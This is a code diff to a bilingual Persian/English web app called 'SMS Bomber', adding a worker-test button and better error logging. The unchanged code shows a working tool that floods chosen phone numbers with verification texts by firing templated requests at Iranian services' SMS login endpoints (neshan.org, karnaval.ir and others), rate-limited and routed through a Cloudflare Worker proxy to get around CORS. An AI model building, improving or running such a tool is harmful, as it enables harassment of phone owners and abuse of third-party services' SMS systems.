@@ -14,6 +14,7 @@
             --accent: #00ff41;
             --green: #00ff41;
             --red: #ff3333;
+            --yellow: #f59e0b;
             --radius: 16px;
             --font: 'Segoe UI', 'Vazir', Tahoma, sans-serif;
             --shadow: 0 0 25px rgba(0,255,65,0.2);
@@ -32,6 +33,7 @@
             --accent: #0a0;
             --green: #0a0;
             --red: #c00;
+            --yellow: #d97706;
             --shadow: 0 0 15px rgba(0,0,0,0.1);
         }
         * { margin:0; padding:0; box-sizing:border-box; }
@@ -135,8 +137,10 @@
         .btn-start:hover { transform: scale(1.03); }
         .btn-stop { background: var(--red); color: #fff; box-shadow: 0 0 15px var(--red); }
         .btn-stop:hover { transform: scale(1.03); }
-        .btn-test { background: #f59e0b; color: #000; box-shadow: 0 0 15px #f59e0b; }
+        .btn-test { background: var(--yellow); color: #000; box-shadow: 0 0 15px var(--yellow); }
         .btn-test:hover { transform: scale(1.03); }
+        .btn-worker { background: #3b82f6; color: #fff; box-shadow: 0 0 15px #3b82f6; }
+        .btn-worker:hover { transform: scale(1.03); }
         .btn-secondary { background: var(--glass); border: 1px solid var(--border); color: var(--text); }
         .tabs {
             display: flex;
@@ -221,6 +225,12 @@
             max-height: 80vh;
             overflow-y: auto;
         }
+        #workerStatus {
+            font-size: 0.8rem;
+            margin-left: auto;
+            margin-right: 10px;
+            align-self: center;
+        }
         @media (max-width: 600px) {
             .toolbar { justify-content: center; }
             h1 { font-size: 1.8rem; }
@@ -232,6 +242,7 @@
     <div class="app-container">
         <!-- نوار ابزار -->
         <div class="toolbar">
+            <span id="workerStatus">⚪ Worker: Unknown</span>
             <button onclick="toggleLanguage()" id="langToggle">🇮🇷 فارسی</button>
             <button onclick="toggleTheme()" id="themeToggle">☀️ Light</button>
             <button onclick="toggleFullscreen()">⛶ Fullscreen</button>
@@ -284,6 +295,7 @@
                 <button class="btn btn-start" id="startBtn" onclick="startAttack()">▶ Start</button>
                 <button class="btn btn-stop" id="stopBtn" onclick="stopAttack()" disabled>⏹ Stop</button>
                 <button class="btn btn-test" id="testBtn" onclick="testAttack()">🧪 Test (10 SMS)</button>
+                <button class="btn btn-worker" id="workerTestBtn" onclick="testWorker()">🔌 Test Worker</button>
                 <button class="btn btn-secondary" onclick="resetAll()">↺ Reset</button>
             </div>
 
@@ -326,6 +338,8 @@
                 <p>Enter one or more phone numbers (09xxxxxxxxx) separated by commas or new lines. Upload a .txt file if needed. Set the sending rate (1-20 req/s), optionally a success target, and enable the Cloudflare Worker proxy. Click <b>Start</b>.</p>
                 <h3>🧪 Test Button</h3>
                 <p>Sends exactly 10 SMS requests to the <b>first phone number</b> in the list, using the current rate and proxy settings. Useful for verifying that everything works before a full run.</p>
+                <h3>🔌 Test Worker</h3>
+                <p>Checks if the Cloudflare Worker is online and responding correctly. If this fails, no SMS will be sent.</p>
                 <h3>🌐 Proxy Setup</h3>
                 <p>The tool uses a Cloudflare Worker to bypass CORS. Deploy the worker code (provided in the repository) and paste its URL here. Without a valid proxy, requests will be blocked by the browser.</p>
                 <h3>⏰ Scheduler</h3>
@@ -387,6 +401,7 @@
                 startBtn: '▶ Start',
                 stopBtn: '⏹ Stop',
                 testBtn: '🧪 Test (10 SMS)',
+                workerTestBtn: '🔌 Test Worker',
                 resetBtn: '↺ Reset',
                 logReady: '⏳ Ready...',
             },
@@ -400,6 +415,7 @@
                 startBtn: '▶ شروع',
                 stopBtn: '⏹ توقف',
                 testBtn: '🧪 تست (۱۰ پیامک)',
+                workerTestBtn: '🔌 تست Worker',
                 resetBtn: '↺ بازنشانی',
                 logReady: '⏳ آماده...',
             }
@@ -416,6 +432,7 @@
             document.getElementById('startBtn').innerText = t.startBtn;
             document.getElementById('stopBtn').innerText = t.stopBtn;
             document.getElementById('testBtn').innerText = t.testBtn;
+            document.getElementById('workerTestBtn').innerText = t.workerTestBtn;
             document.querySelector('.btn-secondary').innerText = t.resetBtn;
             document.getElementById('logBox').innerHTML = t.logReady;
             if (langCode === 'fa') {
@@ -429,7 +446,6 @@
         document.getElementById('langToggle').addEventListener('click', () => {
             setLanguage(lang === 'en' ? 'fa' : 'en');
         });
-        // پیش‌فرض انگلیسی
         setLanguage('en');
 
         // ==================== تم ====================
@@ -502,7 +518,7 @@
             tx.oncomplete = () => loadProfileList();
         }
 
-        // ==================== API Templates ====================
+        // ==================== API Templates (کامل) ====================
         const API_TEMPLATES = [
             {"source":"neshan.org","url":"https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=0{phone}&uuid=web_019e8459-9674-749c-bfe3-7b0364eba2d9","method":"GET","capacity":10},
             {"source":"#karnaval.ir","url":"https://www.karnaval.ir/api/gateway/marketing-campaign-mobile-popup/marketing-campaign-mobile-popup/create","method":"POST","body":'{"campaignId":"000000000000000000000001","mobile":"0{phone}"}',"capacity":10},
@@ -610,7 +626,7 @@
 
         // ==================== متغیرها ====================
         let stats = { total:0, success:0, fail:0 }, stopFlag = false, startTime = 0;
-        const DEFAULT_PROXY = 'https://smsbomber.game-developer-mb.workers.dev';
+        const DEFAULT_PROXY = 'https://YOUR_WORKER_URL.workers.dev'; // ← جایگزین کنید
         document.getElementById('proxyUrl').value = localStorage.getItem('proxyUrl') || DEFAULT_PROXY;
         let chartInstance = null;
 
@@ -640,19 +656,31 @@
         }
         async function sendViaProxy(api, phone, proxyUrl) {
             const url = api.url.replace('{phone}', phone);
-            const method = api.method||'GET';
+            const method = api.method || 'GET';
             let body = api.body ? api.body.replace('{phone}', phone) : null;
-            const resp = await fetch(proxyUrl, {
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({url, method, headers:{'Content-Type':'application/json'}, body})
-            });
-            if (resp.ok) {
-                const data = await resp.json().catch(()=>({}));
-                if (data.error || (data.message && /failed|error/i.test(data.message))) return false;
-                return true;
+            try {
+                const resp = await fetch(proxyUrl, {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({url, method, headers:{'Content-Type':'application/json'}, body})
+                });
+                const status = resp.status;
+                const text = await resp.text();
+                let data;
+                try {
+                    data = JSON.parse(text);
+                } catch {
+                    data = { raw: text.slice(0, 200) };
+                }
+                if (resp.ok) {
+                    if (data.error) return { ok: false, status, message: data.error };
+                    return { ok: true, status, message: '' };
+                } else {
+                    return { ok: false, status, message: data.error || data.message || text.slice(0, 200) };
+                }
+            } catch (e) {
+                return { ok: false, status: 0, message: e.message };
             }
-            return false;
         }
         class TokenBucket {
             constructor(rate){ this.rate=rate; this.tokens=0; this.lastTime=Date.now(); }
@@ -667,90 +695,107 @@
                 }
             }
         }
-        async function runAttack(phone,rate,target,proxyUrl){
-            const bucket=new TokenBucket(rate);
-            const tasks=[];
-            for(const api of API_TEMPLATES){
-                if(stopFlag) break;
-                const cap=api.capacity||0; if(cap<=0) continue;
-                for(let i=0;i<cap;i++){ if(stopFlag) break; tasks.push(api); }
+        async function runAttack(phone, rate, target, proxyUrl) {
+            const bucket = new TokenBucket(rate);
+            const tasks = [];
+            for (const api of API_TEMPLATES) {
+                if (stopFlag) break;
+                const cap = api.capacity || 0;
+                if (cap <= 0) continue;
+                for (let i = 0; i < cap; i++) {
+                    if (stopFlag) break;
+                    tasks.push(api);
+                }
             }
             log(`📱 Sending to ${phone} | ${tasks.length} requests`);
-            for(const api of tasks){
-                if(stopFlag||(target&&stats.success>=target)) break;
+            for (const api of tasks) {
+                if (stopFlag || (target && stats.success >= target)) break;
                 await bucket.consume();
-                try{
-                    const ok=await sendViaProxy(api,phone,proxyUrl);
+                try {
+                    const result = await sendViaProxy(api, phone, proxyUrl);
                     stats.total++;
-                    if(ok) stats.success++; else stats.fail++;
+                    if (result.ok) {
+                        stats.success++;
+                    } else {
+                        stats.fail++;
+                        if (result.status !== 0) {
+                            log(`❌ ${api.source} | Status: ${result.status} | ${result.message}`);
+                        } else {
+                            log(`⚠️ ${api.source} | Network error: ${result.message}`);
+                        }
+                    }
                     updateStats();
-                    const progress=target?(stats.success/target*100):(stats.total/tasks.length*100);
-                    document.getElementById('progressBar').style.width=Math.min(progress,100)+'%';
-                }catch(e){ stats.total++; stats.fail++; updateStats(); }
-                if(target&&stats.success>=target){ log(`🎯 Target reached`); break; }
+                    const progress = target ? (stats.success / target * 100) : (stats.total / tasks.length * 100);
+                    document.getElementById('progressBar').style.width = Math.min(progress, 100) + '%';
+                } catch (e) {
+                    stats.total++;
+                    stats.fail++;
+                    updateStats();
+                    log(`⚠️ Exception in ${api.source}: ${e.message}`);
+                }
+                if (target && stats.success >= target) {
+                    log(`🎯 Target reached`);
+                    break;
+                }
             }
         }
-        async function processPhoneList(phones,rate,target,proxyUrl){
-            for(const phone of phones){
-                if(stopFlag) break;
-                await runAttack(phone,rate,target?Math.ceil(target/phones.length):null,proxyUrl);
+        async function processPhoneList(phones, rate, target, proxyUrl) {
+            for (const phone of phones) {
+                if (stopFlag) break;
+                await runAttack(phone, rate, target ? Math.ceil(target / phones.length) : null, proxyUrl);
             }
             log('🏁 All done');
-            if(Notification.permission==='granted') new Notification('SMS Bomber',{body:'Operation finished.'});
-            document.getElementById('startBtn').disabled=false;
-            document.getElementById('testBtn').disabled=false;
-            document.getElementById('stopBtn').disabled=true;
-            document.getElementById('progressBar').style.width='100%';
+            if (Notification.permission === 'granted') new Notification('SMS Bomber', { body: 'Operation finished.' });
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('testBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            document.getElementById('progressBar').style.width = '100%';
         }
-
-        function startAttack(){
+        function startAttack() {
             const key = new URLSearchParams(window.location.search).get('key');
-            if(!key){ alert('Access key required in URL (?key=...)'); return; }
+            if (!key) { alert('Access key required in URL (?key=...)'); return; }
             const phonesText = document.getElementById('phonesInput').value.trim();
-            const phones = phonesText ? phonesText.split(/[,\n]+/).map(p=>p.trim()).filter(p=>/^09\d{9}$/.test(p)) : [];
-            if(phones.length===0){ alert('Enter at least one valid phone number'); return; }
-            const rate=parseInt(document.getElementById('rateSlider').value);
-            const target=parseInt(document.getElementById('target').value)||0;
-            const scheduler=parseInt(document.getElementById('scheduler').value)||0;
-            const useProxy=document.getElementById('useProxy').checked;
-            const proxyUrl=useProxy ? document.getElementById('proxyUrl').value.trim() : null;
-            if(useProxy && !proxyUrl){ alert('Proxy URL required'); return; }
-            localStorage.setItem('proxyUrl',proxyUrl);
-            stats={total:0,success:0,fail:0}; stopFlag=false; startTime=Date.now();
-            document.getElementById('logBox').innerHTML='';
-            document.getElementById('progressBar').style.width='0%';
-            document.getElementById('startBtn').disabled=true;
-            document.getElementById('testBtn').disabled=true;
-            document.getElementById('stopBtn').disabled=false;
-            if(chartInstance) chartInstance.destroy();
-            const ctx=document.getElementById('liveChart').getContext('2d');
-            chartInstance=new Chart(ctx,{
-                type:'line',
-                data:{labels:[],datasets:[{label:'Success',borderColor:'green',data:[]},{label:'Fail',borderColor:'red',data:[]}]},
-                options:{animation:false,scales:{x:{display:false}}}
+            const phones = phonesText ? phonesText.split(/[,\n]+/).map(p => p.trim()).filter(p => /^09\d{9}$/.test(p)) : [];
+            if (phones.length === 0) { alert('Enter at least one valid phone number'); return; }
+            const rate = parseInt(document.getElementById('rateSlider').value);
+            const target = parseInt(document.getElementById('target').value) || 0;
+            const scheduler = parseInt(document.getElementById('scheduler').value) || 0;
+            const useProxy = document.getElementById('useProxy').checked;
+            const proxyUrl = useProxy ? document.getElementById('proxyUrl').value.trim() : null;
+            if (useProxy && !proxyUrl) { alert('Proxy URL required'); return; }
+            localStorage.setItem('proxyUrl', proxyUrl);
+            stats = { total: 0, success: 0, fail: 0 }; stopFlag = false; startTime = Date.now();
+            document.getElementById('logBox').innerHTML = '';
+            document.getElementById('progressBar').style.width = '0%';
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('testBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            if (chartInstance) chartInstance.destroy();
+            const ctx = document.getElementById('liveChart').getContext('2d');
+            chartInstance = new Chart(ctx, {
+                type: 'line',
+                data: { labels: [], datasets: [{ label: 'Success', borderColor: 'green', data: [] }, { label: 'Fail', borderColor: 'red', data: [] }] },
+                options: { animation: false, scales: { x: { display: false } } }
             });
-            if('Notification' in window) Notification.requestPermission();
-            const go=()=>processPhoneList(phones,rate,target,proxyUrl);
-            if(scheduler>0){ log(`⏰ Scheduled start in ${scheduler}s`); setTimeout(go,scheduler*1000); }
+            if ('Notification' in window) Notification.requestPermission();
+            const go = () => processPhoneList(phones, rate, target, proxyUrl);
+            if (scheduler > 0) { log(`⏰ Scheduled start in ${scheduler}s`); setTimeout(go, scheduler * 1000); }
             else go();
         }
-
-        // ==================== دکمه تست ====================
-        async function testAttack(){
+        async function testAttack() {
             const key = new URLSearchParams(window.location.search).get('key');
-            if(!key){ alert('Access key required in URL (?key=...)'); return; }
+            if (!key) { alert('Access key required in URL (?key=...)'); return; }
             const phonesText = document.getElementById('phonesInput').value.trim();
-            const phones = phonesText ? phonesText.split(/[,\n]+/).map(p=>p.trim()).filter(p=>/^09\d{9}$/.test(p)) : [];
-            if(phones.length===0){ alert('Enter at least one valid phone number'); return; }
-            const testPhone = phones[0]; // فقط اولین شماره
+            const phones = phonesText ? phonesText.split(/[,\n]+/).map(p => p.trim()).filter(p => /^09\d{9}$/.test(p)) : [];
+            if (phones.length === 0) { alert('Enter at least one valid phone number'); return; }
+            const testPhone = phones[0];
             const rate = parseInt(document.getElementById('rateSlider').value);
             const useProxy = document.getElementById('useProxy').checked;
             const proxyUrl = useProxy ? document.getElementById('proxyUrl').value.trim() : null;
-            if(useProxy && !proxyUrl){ alert('Proxy URL required'); return; }
-            localStorage.setItem('proxyUrl',proxyUrl);
+            if (useProxy && !proxyUrl) { alert('Proxy URL required'); return; }
+            localStorage.setItem('proxyUrl', proxyUrl);
 
-            // تنظیم آمار برای تست
-            stats = { total:0, success:0, fail:0 };
+            stats = { total: 0, success: 0, fail: 0 };
             stopFlag = false;
             startTime = Date.now();
             document.getElementById('logBox').innerHTML = '';
@@ -758,49 +803,85 @@
             document.getElementById('startBtn').disabled = true;
             document.getElementById('testBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
-            if(chartInstance) chartInstance.destroy();
+            if (chartInstance) chartInstance.destroy();
             const ctx = document.getElementById('liveChart').getContext('2d');
-            chartInstance = new Chart(ctx,{
-                type:'line',
-                data:{labels:[],datasets:[{label:'Success',borderColor:'green',data:[]},{label:'Fail',borderColor:'red',data:[]}]},
-                options:{animation:false,scales:{x:{display:false}}}
+            chartInstance = new Chart(ctx, {
+                type: 'line',
+                data: { labels: [], datasets: [{ label: 'Success', borderColor: 'green', data: [] }, { label: 'Fail', borderColor: 'red', data: [] }] },
+                options: { animation: false, scales: { x: { display: false } } }
             });
             log(`🧪 Test started: sending 10 requests to ${testPhone}`);
-            // اجرای حمله با هدف ۱۰ موفق
+            // ابتدا تست Worker برای اطمینان
+            await testWorker();
+            // سپس ارسال ۱۰ درخواست
             await runAttack(testPhone, rate, 10, proxyUrl);
             log('🏁 Test completed.');
             document.getElementById('startBtn').disabled = false;
             document.getElementById('testBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
         }
-
-        function stopAttack(){ stopFlag=true; document.getElementById('stopBtn').disabled=true; }
-        function resetAll(){
-            document.getElementById('phonesInput').value='';
-            document.getElementById('rateSlider').value=5; document.getElementById('rateVal').innerText='5';
-            document.getElementById('target').value='';
-            stats={total:0,success:0,fail:0}; updateStats();
-            document.getElementById('progressBar').style.width='0%';
-            document.getElementById('logBox').innerHTML=texts[lang].logReady;
-            if(chartInstance){ chartInstance.destroy(); chartInstance=null; }
-            document.getElementById('startBtn').disabled=false;
-            document.getElementById('testBtn').disabled=false;
+        async function testWorker() {
+            const proxyUrl = document.getElementById('proxyUrl').value.trim();
+            if (!proxyUrl) {
+                log('❌ Proxy URL is empty');
+                document.getElementById('workerStatus').innerText = '🔴 Worker: No URL';
+                return;
+            }
+            log('🔌 Testing Worker connection...');
+            try {
+                const resp = await fetch(proxyUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        url: 'https://httpbin.org/get',
+                        method: 'GET',
+                        headers: {},
+                        body: null
+                    })
+                });
+                const status = resp.status;
+                const text = await resp.text();
+                log(`✅ Worker responded with status ${status}`);
+                if (status === 200) {
+                    log(`📄 Response preview: ${text.slice(0, 200)}`);
+                    document.getElementById('workerStatus').innerText = '🟢 Worker: Online';
+                } else {
+                    log(`❌ Worker error: ${text.slice(0, 200)}`);
+                    document.getElementById('workerStatus').innerText = '🔴 Worker: Offline';
+                }
+            } catch (e) {
+                log(`❌ Failed to connect to Worker: ${e.message}`);
+                log('💡 Check if the Worker URL is correct and CORS is enabled.');
+                document.getElementById('workerStatus').innerText = '🔴 Worker: Offline';
+            }
         }
-        function loadPhonesFile(){
-            const file=document.getElementById('phonesFile').files[0];
-            if(!file) return;
-            const reader=new FileReader();
-            reader.onload=e=>{ document.getElementById('phonesInput').value=e.target.result; };
+        function stopAttack() { stopFlag = true; document.getElementById('stopBtn').disabled = true; }
+        function resetAll() {
+            document.getElementById('phonesInput').value = '';
+            document.getElementById('rateSlider').value = 5; document.getElementById('rateVal').innerText = '5';
+            document.getElementById('target').value = '';
+            stats = { total: 0, success: 0, fail: 0 }; updateStats();
+            document.getElementById('progressBar').style.width = '0%';
+            document.getElementById('logBox').innerHTML = texts[lang].logReady;
+            if (chartInstance) { chartInstance.destroy(); chartInstance = null; }
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('testBtn').disabled = false;
+        }
+        function loadPhonesFile() {
+            const file = document.getElementById('phonesFile').files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = e => { document.getElementById('phonesInput').value = e.target.result; };
             reader.readAsText(file);
         }
-        function switchTab(tab){
-            document.getElementById('statsPanel').style.display=tab==='stats'?'block':'none';
-            document.getElementById('chartPanel').style.display=tab==='chart'?'block':'none';
-            document.getElementById('logPanel').style.display=tab==='log'?'block':'none';
-            document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
+        function switchTab(tab) {
+            document.getElementById('statsPanel').style.display = tab === 'stats' ? 'block' : 'none';
+            document.getElementById('chartPanel').style.display = tab === 'chart' ? 'block' : 'none';
+            document.getElementById('logPanel').style.display = tab === 'log' ? 'block' : 'none';
+            document.querySelectorAll('.tab').forEach(b => b.classList.remove('active'));
             event.target.classList.add('active');
         }
-        function showHelp(){ document.getElementById('helpModal').style.display='flex'; }
+        function showHelp() { document.getElementById('helpModal').style.display = 'flex'; }
         // راه‌اندازی
         loadProfileList();
         updateStats();
